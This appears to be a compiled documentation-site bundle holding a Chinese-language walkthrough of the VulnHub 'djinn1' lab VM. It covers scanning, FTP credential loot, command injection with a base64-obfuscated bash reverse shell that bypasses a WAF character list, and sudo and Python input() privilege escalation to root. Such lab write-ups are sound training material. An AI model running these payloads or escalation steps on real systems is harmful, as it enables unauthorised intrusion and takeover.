"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[6602],{8453:(n,r,e)=>{e.d(r,{R:()=>o,x:()=>_});var s=e(6540);const t={},i=s.createContext(t);function o(n){const r=s.useContext(i);return s.useMemo((function(){return"function"==typeof n?n(r):{...r,...n}}),[r,n])}function _(n){let r;return r=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:o(n.components),s.createElement(i.Provider,{value:r},n.children)}},9660:(n,r,e)=>{e.r(r),e.d(r,{assets:()=>a,contentTitle:()=>_,default:()=>c,frontMatter:()=>o,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/djinn1","title":"djinn1","description":"port scan","source":"@site/docs/VulnHub/Virtual Machines/djinn1.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/djinn1","permalink":"/docs/VulnHub/Virtual Machines/djinn1","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/djinn1.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"devt-improved","permalink":"/docs/VulnHub/Virtual Machines/devt-improved"},"next":{"title":"jarbas","permalink":"/docs/VulnHub/Virtual Machines/jarbas"}}');var t=e(4848),i=e(8453);const o={},_=void 0,a={},l=[{value:"port scan",id:"port-scan",level:2},{value:"web",id:"web",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function d(n){const r={code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,i.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(r.h2,{id:"port-scan",children:"port scan"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Wed Feb  5 04:44:05 2025 as: nmap -sT --min-rate=8899 -p- -oN nmap_result/port 192.168.56.145\r\nNmap scan report for bogon (192.168.56.145)\r\nHost is up (0.013s latency).\r\nNot shown: 65532 closed tcp ports (conn-refused)\r\nPORT     STATE SERVICE\r\n21/tcp   open  ftp\r\n1337/tcp open  waste\r\n7331/tcp open  swx\n"})}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Wed Feb  5 04:44:45 2025 as: nmap -sT -sVC -O -p21,1337,7331 -oN nmap_result/detils 192.168.56.145\r\nNmap scan report for bogon (192.168.56.145)\r\nHost is up (0.0011s latency).\r\n\r\nPORT     STATE SERVICE VERSION\r\n21/tcp   open  ftp     vsftpd 3.0.3\r\n| ftp-syst: \r\n|   STAT: \r\n| FTP server status:\r\n|      Connected to ::ffff:192.168.56.138\r\n|      Logged in as ftp\r\n|      TYPE: ASCII\r\n|      No session bandwidth limit\r\n|      Session timeout in seconds is 300\r\n|      Control connection is plain text\r\n|      Data connections will be plain text\r\n|      At session startup, client count was 4\r\n|      vsFTPd 3.0.3 - secure, fast, stable\r\n|_End of status\r\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\r\n| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt\r\n| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt\r\n|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt\r\n1337/tcp open  waste?\r\n| fingerprint-strings: \r\n|   NULL: \r\n|     ____ _____ _ \r\n|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ \r\n|     \\x20/ _ \\x20 | | | | '_ ` _ \\x20/ _ \\n| |_| | (_| | | | | | | __/ | | | | | | | | | __/\r\n|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|\r\n|     Let's see how good you are with simple maths\r\n|     Answer my questions 1000 times and I'll give you your gift.\r\n|     '*', 8)\r\n|   RPCCheck: \r\n|     ____ _____ _ \r\n|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ \r\n|     \\x20/ _ \\x20 | | | | '_ ` _ \\x20/ _ \\n| |_| | (_| | | | | | | __/ | | | | | | | | | __/\r\n|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|\r\n|     Let's see how good you are with simple maths\r\n|     Answer my questions 1000 times and I'll give you your gift.\r\n|_    '+', 3)\r\n7331/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)\r\n|_http-title: Lost in space\r\n|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+\r\nMAC Address: 08:00:27:5E:E0:70 (Oracle VirtualBox virtual NIC)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 3.X|4.X\r\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\r\nOS details: Linux 3.2 - 4.9\r\nNetwork Distance: 1 hop\r\nService Info: OS: Unix\n"})}),"\n",(0,t.jsx)(r.p,{children:"ftp\u533f\u540d\u767b\u5f55"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/djinn1]\r\n\u2514\u2500$ cat creds.txt         \r\nnitu:81299\r\n\r\n\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/djinn1]\r\n\u2514\u2500$ cat game.txt \r\noh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the \r\nfinal level and get the prize.\r\n\r\n\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/djinn1]\r\n\u2514\u2500$ cat message.txt \r\n@nitish81299 I am going on holidays for few days, please take care of all the work. \r\nAnd don't mess up anything.\n"})}),"\n",(0,t.jsx)(r.h2,{id:"web",children:"web"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-shell",children:"gobuster dir -u http://192.168.56.145:7331 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   \r\n===============================================================\r\nGobuster v3.6\r\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\r\n===============================================================\r\n[+] Url:                     http://192.168.56.145:7331\r\n[+] Method:                  GET\r\n[+] Threads:                 10\r\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r\n[+] Negative Status codes:   404\r\n[+] User Agent:              gobuster/3.6\r\n[+] Timeout:                 10s\r\n===============================================================\r\nStarting gobuster in directory enumeration mode\r\n===============================================================\r\n/wish                 (Status: 200) [Size: 385]\r\n/genie                (Status: 200) [Size: 1676]\n"})}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.code,{children:"wish"})}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250205204940321.png",alt:"image-20250205204940321"})}),"\n",(0,t.jsxs)(r.p,{children:["\u6267\u884c\u547d\u4ee4",(0,t.jsx)(r.code,{children:"id"})]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{children:"http://192.168.56.145:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A\n"})}),"\n",(0,t.jsx)(r.p,{children:"\u6210\u529f\u6267\u884c"}),"\n",(0,t.jsx)(r.p,{children:"\u4f46\u662f\u5b58\u5728waf"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{children:'["/", ".", "?", "*", "^", "$", "eval", ";"]\n'})}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{children:'echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTM4LzEyMzQgMD4mMQ==" | base64 -d | bash\n'})}),"\n",(0,t.jsx)(r.p,{children:"\u53cd\u5f39\u6210\u529f"}),"\n",(0,t.jsx)(r.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,t.jsxs)(r.p,{children:[(0,t.jsx)(r.code,{children:"/home/nitish/.dev"}),"\u5b58\u5728nitish\u7684\u51ed\u636e"]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-shell",children:"www-data@djinn:/home/nitish/.dev$ ls\r\ncreds.txt\r\nwww-data@djinn:/home/nitish/.dev$ cat creds.txt\r\nnitish:p4ssw0rdStr3r0n9\n"})}),"\n",(0,t.jsx)(r.p,{children:"\u5207\u6362\u5230nitish\u7528\u6237"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-shell",children:"nitish@djinn:~$ sudo -l\r\nMatching Defaults entries for nitish on djinn:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\r\n\r\nUser nitish may run the following commands on djinn:\r\n    (sam) NOPASSWD: /usr/bin/genie\n"})}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-shell",children:"nitish@djinn:~$ /usr/bin/genie -h\r\nusage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish\r\n\r\nI know you've came to me bearing wishes in mind. So go ahead make your wishes.\r\n\r\npositional arguments:\r\n  wish                  Enter your wish\r\n\r\noptional arguments:\r\n  -h, --help            show this help message and exit\r\n  -g, --god             pass the wish to god\r\n  -p SHELL, --shell SHELL\r\n                        Gives you shell\r\n  -e EXEC, --exec EXEC  execute command\n"})}),"\n",(0,t.jsx)(r.p,{children:"\u67e5\u770bgenie\u7684\u7528\u6cd5"}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.code,{children:"man genie"})}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{children:"-cmd\r\n\tYou know sometime all you new is a damn CMD, windows I love you.\n"})}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250205210318672.png",alt:"image-20250205210318672"})}),"\n",(0,t.jsxs)(r.p,{children:["\u52a0\u4e0a",(0,t.jsx)(r.code,{children:"-cmd"}),"\u53c2\u6570"]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-shell",children:"nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd id\r\nmy man!!\r\n$ id\r\nuid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)\n"})}),"\n",(0,t.jsx)(r.p,{children:"\u6210\u529f\u5207\u6362\u5230sam\u7528\u6237"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-shell",children:"$ ls -la\r\ntotal 36\r\ndrwxr-x--- 4 sam  sam  4096 Nov 14  2019 .\r\ndrwxr-xr-x 4 root root 4096 Nov 14  2019 ..\r\n-rw------- 1 root root  417 Nov 14  2019 .bash_history\r\n-rw-r--r-- 1 root root  220 Oct 20  2019 .bash_logout\r\n-rw-r--r-- 1 sam  sam  3771 Oct 20  2019 .bashrc\r\ndrwx------ 2 sam  sam  4096 Nov 11  2019 .cache\r\ndrwx------ 3 sam  sam  4096 Oct 20  2019 .gnupg\r\n-rw-r--r-- 1 sam  sam   807 Oct 20  2019 .profile\r\n-rw-r--r-- 1 sam  sam  1749 Nov  7  2019 .pyc\r\n-rw-r--r-- 1 sam  sam     0 Nov  7  2019 .sudo_as_admin_successful\r\n$ file .pyc\r\n.pyc: python 2.7 byte-compiled\n"})}),"\n",(0,t.jsxs)(r.p,{children:["\u5b58\u5728",(0,t.jsx)(r.code,{children:".pyc"}),"\u6587\u4ef6"]}),"\n",(0,t.jsx)(r.p,{children:"\u53cd\u7f16\u8bd1pyc\u6587\u4ef6"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-python",children:"# Source Generated with Decompyle++\r\n# File: 1.pyc (Python 2.7)\r\n\r\nfrom getpass import getuser\r\nfrom os import system\r\nfrom random import randint\r\n\r\ndef naughtyboi():\r\n    print 'Working on it!! '\r\n\r\n\r\ndef guessit():\r\n    num = randint(1, 101)\r\n    print 'Choose a number between 1 to 100: '\r\n    s = input('Enter your number: ')\r\n    if s == num:\r\n        system('/bin/sh')\r\n    else:\r\n        print 'Better Luck next time'\r\n\r\n\r\ndef readfiles():\r\n    user = getuser()\r\n    path = input('Enter the full of the file to read: ')\r\n    print 'User %s is not allowed to read %s' % (user, path)\r\n\r\n\r\ndef options():\r\n    print 'What do you want to do ?'\r\n    print '1 - Be naughty'\r\n    print '2 - Guess the number'\r\n    print '3 - Read some damn files'\r\n    print '4 - Work'\r\n    choice = int(input('Enter your choice: '))\r\n    return choice\r\n\r\n\r\ndef main(op):\r\n    if op == 1:\r\n        naughtyboi()\r\n    elif op == 2:\r\n        guessit()\r\n    elif op == 3:\r\n        readfiles()\r\n    elif op == 4:\r\n        print 'work your ass off!!'\r\n    else:\r\n        print 'Do something better with your life'\r\n\r\nif __name__ == '__main__':\r\n    main(options())\n"})}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-shell",children:"$ sudo -l\r\nMatching Defaults entries for sam on djinn:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\r\n\r\nUser sam may run the following commands on djinn:\r\n    (root) NOPASSWD: /root/lago\n"})}),"\n",(0,t.jsxs)(r.p,{children:["\u8fd0\u884c",(0,t.jsx)(r.code,{children:"/root/lago"}),"\uff0c\u53d1\u73b0\u4e0a\u9762\u7684py\u4ee3\u7801\u5c31\u662f\u8be5\u6587\u4ef6\u6e90\u7801"]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-shell",children:"$ sudo /root/lago\r\nWhat do you want to do ?\r\n1 - Be naughty\r\n2 - Guess the number\r\n3 - Read some damn files\r\n4 - Work\r\nEnter your choice:2\r\n2\r\nChoose a number between 1 to 100: \r\nEnter your number: num\r\nnum\r\n# whoami\r\nroot\r\n# id\r\nuid=0(root) gid=0(root) groups=0(root)\n"})}),"\n",(0,t.jsxs)(r.p,{children:["\u8f93\u5165",(0,t.jsx)(r.code,{children:"num"}),"\u5c31\u53ef\u4ee5\uff0c\u62ff\u5230root\u7684shell"]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-shell",children:"# ls\r\nlago  proof.sh\r\n# bash proof.sh\r\n    _                        _             _ _ _ \r\n   / \\   _ __ ___   __ _ ___(_)_ __   __ _| | | |\r\n  / _ \\ | '_ ` _ \\ / _` |_  / | '_ \\ / _` | | | |\r\n / ___ \\| | | | | | (_| |/ /| | | | | (_| |_|_|_|\r\n/_/   \\_\\_| |_| |_|\\__,_/___|_|_| |_|\\__, (_|_|_)\r\n                                     |___/       \r\ndjinn pwned...\r\n__________________________________________________________________________\r\n\r\nProof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc\r\nPath: /root\r\nDate: Wed Feb 5 18:42:28 IST 2025\r\nWhoami: root\r\n__________________________________________________________________________\r\n\r\nBy @0xmzfr\r\n\r\nThanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)\n"})})]})}function c(n={}){const{wrapper:r}={...(0,i.R)(),...n.components};return r?(0,t.jsx)(r,{...n,children:(0,t.jsx)(d,{...n})}):d(n)}}}]);